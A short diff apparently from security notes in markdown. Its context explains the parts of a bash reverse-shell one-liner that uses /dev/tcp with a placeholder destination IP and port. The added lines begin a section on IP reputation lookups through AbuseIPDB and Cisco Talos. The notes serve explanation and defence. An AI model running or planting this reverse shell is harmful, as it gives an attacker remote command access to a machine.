@@ -77,3 +77,5 @@ bash -i >& /dev/tcp/<dest_ip>/<port_ip> 0>&1
 - 0>&1: This part redirects standard input (stdin) from the same source as standard output (stdout). In other words, it makes the shell read its input from the same TCP connection that it's writing its output to.
 
 
+## IP reputation scanner
+There are many open-source databases out there, like AbuseIPDB, and Cisco Talos Intelligence, where you can perform a reputation and location check for the IP address
